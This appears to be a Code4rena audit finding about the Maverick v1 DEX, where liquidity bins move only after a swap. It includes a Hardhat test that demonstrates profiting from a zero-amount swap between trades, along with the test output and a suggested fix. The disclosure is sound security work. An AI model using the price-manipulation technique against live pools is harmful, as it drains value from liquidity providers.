## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- satisfactory
- selected for report
- sponsor disputed
- edited-by-warden
- M-03

# [Trader can manipulate price because bin only moved after swap](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/35) 

# Lines of code

https://github.com/code-423n4/2022-12-Stealth-Project/blob/fc8589d7d8c1d8488fd97ccc46e1ff11c8426ac2/maverick-v1/contracts/models/Pool.sol#L306


# Vulnerability details

## Impact

In Maverick, liquidity bin is only moved after a swap

https://github.com/code-423n4/2022-12-Stealth-Project/blob/fc8589d7d8c1d8488fd97ccc46e1ff11c8426ac2/maverick-v1/contracts/models/Pool.sol#L305-L306

```solidity
        emit Swap(msg.sender, recipient, tokenAIn, exactOutput, amountIn, amountOut, currentState.activeTick);
        _moveBins(currentState.activeTick, startingTick, lastTwa);
```

If the pool do not have a lot of activity (which is very common for newer DEX / tail asset), the bin will not be moved to the expected position. Trader will have a free option to manipulate price in their favor.

## Proof of Concept

Adding this test case to ./maverick-v1/test/models/Pool.ts

```typescript
    describe.only("when the twap moves and there are bins that can be moved", () => {
      beforeEach(async () => {
        await testPool.addLiquidity(1, [
          {
            kind: 1,
            isDelta: true,
            pos: 0,
            deltaA: floatToFixed(3),
            deltaB: floatToFixed(3),
          },
          {
            kind: 1,
            isDelta: true,
            pos: 2,
            deltaA: floatToFixed(3),
            deltaB: floatToFixed(3),
          },
          {
            kind: 1,
            isDelta: true,
            pos: 10,
            deltaA: floatToFixed(0),
            deltaB: floatToFixed(10),
          },
        ]);
      });
    
    it("+10, 0, -10", async () => {
      await testPool.swap(
        await owner.getAddress(),
        floatToFixed(10),
        true,
        false
      );
      await ethers.provider.send("evm_increaseTime", [3600]);
      await ethers.provider.send("evm_mine", []);
      await testPool.swap(
        await owner.getAddress(),
        floatToFixed(0),
        false,
        true
      );
      await testPool.swap(
        await owner.getAddress(),
        floatToFixed(10),
        false,
        true
      );
      const afterTokenABalance = fixedToFloat(
        await tokenA.balanceOf(await owner.getAddress())
      );
      const afterTokenBBalance = fixedToFloat(
        await tokenB.balanceOf(await owner.getAddress())
      );
      console.log(afterTokenABalance, afterTokenBBalance);
    });
    it("+10, -10", async () => {
      await testPool.swap(
        await owner.getAddress(),
        floatToFixed(10),
        true,
        false
      );
      await ethers.provider.send("evm_increaseTime", [3600]);
      await ethers.provider.send("evm_mine", []);
      await testPool.swap(
        await owner.getAddress(),
        floatToFixed(10),
        false,
        true
      );
      const afterTokenABalance = fixedToFloat(
        await tokenA.balanceOf(await owner.getAddress())
      );
      const afterTokenBBalance = fixedToFloat(
        await tokenB.balanceOf(await owner.getAddress())
      );
      console.log(afterTokenABalance, afterTokenBBalance);
    });
  });
```

```
  Pool
    #swap
      when the twap moves and there are bins that can be moved
99999999997 99999999987.17587
        ✓ +10, 0, -10
99999999997 99999999983.95761
        ✓ +10, -10
```

In the 1st test, the trader buy 10 token, wait an hour, sell 0 token (to update bin), sell 10 token.
In the 2nd test, the trader buy 10 token, wait an hour, sell 10 token

As shown, if the trader execute a 0 token trade in between, he will receive much more token.

On the other hand, if the trader is trying to buy more token, he can get a better price if the bin is not updated.

## Recommended Mitigation Steps

Move the bin at the beginning of a swap after updating twap